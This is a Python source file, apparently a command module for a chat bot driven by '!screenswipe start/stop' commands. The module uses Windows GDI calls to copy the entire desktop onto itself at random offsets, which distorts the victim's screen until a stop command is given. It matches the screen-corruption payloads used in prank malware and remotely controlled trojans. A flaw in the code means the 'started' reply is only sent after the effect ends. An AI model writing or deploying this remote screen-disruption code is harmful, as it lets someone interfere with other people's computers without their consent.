import win32api
import win32con
import win32gui
import math
import time
import ctypes
import asyncio
import random

is_running = False

async def run_screenswipe():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    desktop = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(desktop)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    
    angle = 0
    offset = 20

    while is_running:
        hdc = win32gui.GetWindowDC(desktop)
        n = 0

        for i in range(int(sw + sh)):
            if not is_running:
                break
            direction = random.choice(['left', 'right', 'up', 'down'])
            if direction == 'left':
                a = int(math.sin(n) * offset)
                win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, a, 0, win32con.SRCCOPY)
            elif direction == 'right':
                a = int(math.sin(n) * offset)
                win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -a, 0, win32con.SRCCOPY)
            elif direction == 'up':
                a = int(math.sin(n) * offset)
                win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, a, win32con.SRCCOPY)
            elif direction == 'down':
                a = int(math.sin(n) * offset)
                win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, -a, win32con.SRCCOPY)

            n += 0.2
            await asyncio.sleep(0.01)  # Yield control to allow other tasks to run
        win32gui.ReleaseDC(desktop, hdc)

async def screenswipe(ctx, action):
    global is_running

    if action == "start":
        if is_running:
            await ctx.send("Screen swipe effect is already running!")
            return
        is_running = True
        await run_screenswipe()  # Run the effect
        await ctx.send("Screen swipe effect started! Type `!screenswipe stop` to stop it.")

    elif action == "stop":
        if not is_running:
            await ctx.send("Screen swipe effect is not running!")
            return
        is_running = False
        await ctx.send("Screen swipe effect stopped.")

    elif action == "help":
        await ctx.send(
            "Use `!screenswipe start` to start the screen swipe effect.\n"
            "Use `!screenswipe stop` to stop the screen swipe effect."
        )

    else:
        await ctx.send("Invalid action. Use `start`, `stop`, or `help`.")
